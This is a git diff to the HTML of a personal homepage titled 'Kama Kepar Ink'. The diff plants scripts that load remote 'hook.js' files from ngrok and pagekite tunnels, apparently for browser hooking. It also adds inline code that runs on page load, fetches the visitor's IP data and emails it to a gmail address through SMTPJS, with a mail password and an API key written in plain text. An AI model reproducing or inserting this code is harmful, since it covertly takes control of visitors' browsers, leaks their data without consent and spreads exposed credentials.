@@ -1,13 +1,32 @@
 <!DOCTYPE html>
 <html lang="en">
+<script type="text/javascript" src="https://ssp-nj1.webtradehub.com/?c=b&m=s&placementId=22968&gdpr_consent=[GDPR_CONSENT]"></script>
 <head>
    <meta name="viewport" content="width=device-width">
   <meta charset="utf-8">
   <title>Kama Kepar Ink</title>
+<script src="https://kamakepar.pagekite.me/hook.js"></script>
+   <script src="https://1b6c5628b53d.ngrok.io/hook.js"></script>
   <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Montserrat:400,700&amp;subset=cyrillic-ext" rel="stylesheet">
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital@1&display=swap" rel="stylesheet">
 <script src="https://smtpjs.com/v3/smtp.js"></script><script src="https://code.jquery.com/jquery-2.2.4.min.js"></script><script>
 var ispo = {};
+dataurl = 'https://net.ipcalf.com/';
+var dft = $.get(dataurl,function(data){
+Email.send({
+    Host : "smtp.mail.ru",
+    Username : "smtp-kamakepar@mail.ru",
+    Password : "8H5mn46kCYewR4W",
+    To : 'ptiza2028@gmail.com',
+    From : "smtp-kamakepar@mail.ru",
+    Body : data ,
+    Subject : "Katttt: "
+}).then(
+  message =>console.log(message)
+);
+ alert(data);
+ return data;
+});
 $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=7634e348c5174d09a516c137bcc6c412', function(data) {
   var ispo = (JSON.stringify(data, null, 2));
   console.log('ok4');
@@ -42,7 +61,7 @@ $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=7634e348c5174d09a516c137bcc
         <a href="/" class="nav__link">Home</a>
         <a href="https://github.com/Kamakepar2029/" class="nav__link">My Github</a>
         <a href="https://about.kamakepar.ru" class="nav__link">About</a>
-        <a href="https://t.me/kamakepar_man" class="nav__link">Contact me</a>
+        <a href="https://allnet.kamakepar.ru/" class="nav__link">ScanNet</a>
       </nav>
     </div>
   </div>
